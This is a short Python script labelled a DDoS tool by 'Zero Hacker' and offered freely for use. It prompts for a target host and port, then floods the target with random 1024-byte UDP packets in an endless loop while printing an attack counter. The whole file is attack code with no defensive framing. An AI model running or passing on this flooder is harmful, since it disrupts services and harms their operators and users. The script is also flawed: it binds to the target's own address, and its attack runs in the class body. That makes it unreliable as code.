import socket
import os

"""
Example Python DDos Script
Code by Zero Hacker

Free to Development or to use
"""

class main():
    # Defind Ojb
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # socket.AF_INET --> IPv4
    # socket.AF_INET6 --> IPv6
    # socket.SOCKET_STREAM --> TCP/IP
    # socket.SOCKET_DGRAM --> UDP

    # User Input
    host = str(input("Enter Target : "))
    port = int(input("Enter Port to Attack : "))

    # Binding the Target
    s.bind((host, port))
    
    # Generate Data to Send
    byte = os.urandom(1024)

    sent = 1

    # Working
    while True:
        s.sendto(byte, (host, port)) # Send UDP Package
        # s.send(byte, (host, port)) # Send TCP/IP Package

        print("Attacking ", sent, "To", host, "with port", port)
        sent = sent + 1

if __name__ == "__main__":
    main()

